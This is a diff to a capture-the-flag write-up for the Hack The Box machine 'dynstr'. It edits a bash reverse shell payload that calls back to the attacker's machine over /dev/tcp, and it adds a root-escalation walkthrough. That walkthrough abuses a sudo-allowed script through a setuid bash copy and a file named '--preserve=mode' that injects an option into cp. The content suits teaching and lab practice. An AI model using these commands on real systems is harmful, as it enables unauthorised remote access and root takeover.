@@ -150,7 +150,7 @@ good <Redacted IP address>
 ## Obtaining User flag
 Firstly, we have to obtain a Base64 encoding of the following payload:
 ```
-bash -i >& /dev/tcp/<IP address of your local machine>/300 0>&1
+bash -i >& /dev/tcp/<IP address of your local machine>/3000 0>&1
 ```
 
 Afterwards, we have to replace the hostname payload on the URL with a URL-encoded payload of the following format:
@@ -299,4 +299,105 @@ support-case-C62796521  user.txt
 bindmgr@dynstr:~$ cat user.txt
 <Redacted user flag>
 bindmgr@dynstr:~$ 
+```
+
+## Obtaining system flag
+First, we will run ```sudo -l``` to check the permissions of the binaries and we realize that ```/usr/local/bin/bindmgr.sh``` can be executed with root privileges without any password.
+```
+bindmgr@dynstr:~$ sudo -l
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries for bindmgr on dynstr:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
+bindmgr@dynstr:~$ 
+```
+
+### Code Analysis of bindmgr.sh
+The first part of the code shows that the current directory would require a ```.version``` file with a version number as the command ```cat .version``` is being executed.
+```
+# Check versioning (.version)
+echo "[+] Running $0 to stage new configuration from $PWD."
+if [[ ! -f .version ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 42
+fi
+if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
+    echo "[-] ERROR: Check versioning. Exiting."
+    exit 43
+fi
+```
+
+The second part of the code creates a ```/etc/bind/named.conf.bindmgr``` configuration file, and prints all the files in the ```/etc/bind/named.bindmgr``` directory into the configuration file.
+```
+# Create config file that includes all files from named.bindmgr.
+echo "[+] Creating $BINDMGR_CONF file."
+printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
+for file in * ; do
+    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
+done
+```
+
+The third part of the code copies all the files in the current directory to ```/etc/bind/named.bindmgr```
+```
+# Stage new version of configuration files.
+echo "[+] Staging files to $BINDMGR_DIR."
+cp .version * /etc/bind/named.bindmgr/
+```
+
+### Exploit
+First, we will have to create a version file with a version number
+```
+echo "2" > .version
+```
+Next, we will have to copy the ```/bin/bash``` binary so that we can get a privileged binary when the script is executed.
+```
+bindmgr@dynstr:~$ cp /bin/bash .
+bindmgr@dynstr:~$ ls -la
+total 1196
+drwxr-xr-x 5 bindmgr bindmgr    4096 Aug 21 12:45 .
+drwxr-xr-x 4 root    root       4096 Mar 15 20:26 ..
+-rwxr-xr-x 1 bindmgr bindmgr 1183448 Aug 21 12:45 bash
+lrwxrwxrwx 1 bindmgr bindmgr       9 Mar 15 20:29 .bash_history -> /dev/null
+-rw-r--r-- 1 bindmgr bindmgr     220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 bindmgr bindmgr    3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr    4096 Mar 13 12:09 .cache
+-rw-r--r-- 1 bindmgr bindmgr     807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr    4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr    4096 Mar 13 14:53 support-case-C62796521
+-r-------- 1 bindmgr bindmgr      33 Aug 21 11:54 user.txt
+-rw-rw-r-- 1 bindmgr bindmgr       2 Aug 21 12:40 .version
+```
+Afterwards, we will have to give the binary setuid bits and also create a ```--preserve=mode``` so that the script executes ```cp --preserve=mode /etc/bind/named.bindmgr``` which allows the privilege on bash to be preserved when the script is executed.
+```
+bindmgr@dynstr:~$ chmod +s bash
+bindmgr@dynstr:~$ echo > --preserve=mode
+bindmgr@dynstr:~$ ls
+ bash  '--preserve=mode'  support-case-C62796521   user.txt
+```
+Next, we will have to execute the script so that the bash biinary with root privileges will be copied to ```/etc/bind/named.bindmgr```
+```
+bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
+sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
+[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
+[+] Creating /etc/bind/named.conf.bindmgr file.
+[+] Staging files to /etc/bind/named.bindmgr.
+cp: -r not specified; omitting directory 'support-case-C62796521'
+[+] Checking staged configuration.
+[-] ERROR: The generated configuration is not valid. Please fix following errors: 
+    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
+    /etc/bind/named.bindmgr/bash:14: unknown option 'h�ȀE�'
+    /etc/bind/named.bindmgr/bash:40: unknown option '�YF'
+    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
+```
+Lastly, we will just have to navigate to ```/etc/bind/named.bindmgr``` so that the bash can be executed with root privileges and obtain the system flag.
+```
+bindmgr@dynstr:~$ cd /etc/bind/named.bindmgr
+bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
+bash-5.0# cd /root/
+bash-5.0# cat root.txt
+<Redacted system flag>
+bash-5.0# 
 ```
